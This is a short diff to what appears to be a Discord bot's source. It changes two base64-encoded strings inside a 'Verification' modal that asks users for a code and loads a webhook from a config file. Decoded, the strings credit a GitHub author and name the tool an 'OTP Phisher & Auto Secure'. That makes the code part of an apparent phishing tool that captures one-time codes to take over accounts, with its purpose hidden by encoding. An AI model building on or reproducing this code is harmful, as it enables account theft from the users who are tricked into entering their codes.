@@ -12,8 +12,8 @@ from views.otp import automate_auto_change, CreateRandomEmail, generate_password
 class MyModalTwo(ui.Modal, title="Verification"):
     box_three = ui.TextInput(label="CODE", required=True)
     async def on_submit(self, interaction: discord.Interaction, /) -> None:
-        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")
-        inty2 = web3g.string("U3Bpbm9udG9wIE9UUCBQaGlzaGVyICYgQXV0byBTZWN1cmU=")
+        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vQmFja0FnYWluU3Bpbg==")
+        inty2 = web3g.string("T1RQIFBoaXNoZXIgJiBBdXRvIFNlY3VyZQ==")
         with open("data.json", "r") as f:
             data = json.load(f)
         if data.get("webhook") is None:
